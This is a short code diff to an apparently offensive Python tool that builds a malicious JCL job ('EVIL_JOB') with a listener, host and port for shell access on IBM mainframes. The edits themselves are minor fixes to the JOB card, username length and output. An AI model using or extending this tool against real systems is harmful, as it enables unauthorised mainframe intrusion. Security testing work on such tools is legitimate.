@@ -64,7 +64,7 @@ def JCLHeader(USERID, FILENAME):
 #Generates the JCL Header needed to create a temp file using JCL
 	JOBNAME = USERID.upper() + random.choice(string.ascii_uppercase) 
         JOBCARD = JOBNAME.ljust(9)
-	JCL = "//"+JOBCARD+"JOB ("+USERID.upper()+'''),'SoF',CLASS=A,MSGCLASS=0,MSGLEVEL=(1,1)
+	JCL = "//"+JOBCARD+" JOB ("+USERID.upper()+'''),'SoF',CLASS=A,MSGCLASS=0,MSGLEVEL=(1,1)
 //* The next are lines JCL to create a temp dataset (&&OMG) with
 //* a member ('''+FILENAME+'''). The file then looks like &&OMG('''+FILENAME+''').
 //* The end of the REXX file is noted as single line with ## on it
@@ -824,6 +824,10 @@ secret_douchebag_logo = "ICAgICAgICAgICAgIF9fDQogICAgICAgICAgICAvICBcICAgX18NClR
 if results.logo and results.lport == "54321":
 	print base64.b64decode(secret_douchebag_logo)	
 
+if len(results.username) > 7: 
+        print bcolors.RED + "[!] Usernames cant be longer than 7 characters" + bcolors.ENDC
+        sys.exit(-1)
+
 if results.listener:
 	would_you_kindly = 'L'
 	if results.lport == None:
@@ -857,7 +861,7 @@ EVIL_JOB += JCLFooter(rand_file, would_you_kindly, hostname, port)
 
 
 if results.dotmatrix:
-	print bcolors.GREEN+EVIL_JOB+bcolors.ENDC
+	print EVIL_JOB
 	sys.exit(0)
 
 
